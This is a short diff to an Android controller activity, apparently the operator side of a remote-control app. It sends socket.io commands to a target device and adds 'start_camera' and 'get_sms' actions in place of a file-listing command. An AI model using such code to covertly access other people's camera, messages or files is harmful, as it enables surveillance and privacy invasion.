@@ -2,9 +2,9 @@ package com.testapp;
 
 import android.app.Activity;
 import android.app.AlertDialog;
+import android.content.Intent;
 import android.os.Bundle;
 import android.view.Gravity;
-import android.view.View;
 import android.widget.*;
 import io.socket.client.IO;
 import io.socket.client.Socket;
@@ -124,14 +124,22 @@ public class ControlActivity extends Activity {
     }
 
     private void handleAction(String cmd) {
+        Intent intent = null;
         switch (cmd) {
-            case "list_files":
-                showInputDialog("Path (/sdcard)", path -> sendCmd(cmd, new JSONObject() {{
-                    try { put("path", path.isEmpty() ? "/sdcard" : path); } catch (Exception e) {}
-                }}));
+            case "start_camera":
+                intent = new Intent(this, CameraActivity.class);
                 break;
-            default:
-                sendCmd(cmd, new JSONObject());
+            case "get_sms":
+                intent = new Intent(this, SmsActivity.class);
+                break;
+            // Tambahkan case lain nanti
+        }
+        if (intent != null) {
+            intent.putExtra("deviceId", deviceId);
+            startActivity(intent);
+        } else {
+            // Kirim perintah biasa
+            sendCmd(cmd, new JSONObject());
         }
     }
 
